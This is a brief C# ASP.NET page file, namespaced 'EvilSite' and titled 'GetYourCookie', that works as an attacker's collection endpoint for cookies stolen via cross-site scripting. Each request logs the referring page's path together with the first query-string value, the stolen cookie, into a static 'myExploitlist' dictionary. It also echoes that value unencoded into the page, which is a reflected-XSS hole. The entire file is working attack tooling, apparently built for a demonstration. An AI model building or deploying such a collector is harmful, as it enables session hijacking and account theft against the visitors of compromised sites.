using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace EvilSite
{
    public partial class GetYourCookie : System.Web.UI.Page
    {
        internal static System.Collections.Concurrent.ConcurrentDictionary<string, string> myExploitlist = new System.Collections.Concurrent.ConcurrentDictionary<string, string>();
        protected void Page_Load(object sender, EventArgs e)
        {
            myExploitlist.TryAdd(Request.UrlReferrer.AbsolutePath, Request.QueryString[0].ToString());
            lblDisplay.Text = Request.QueryString[0];
        }
    }
}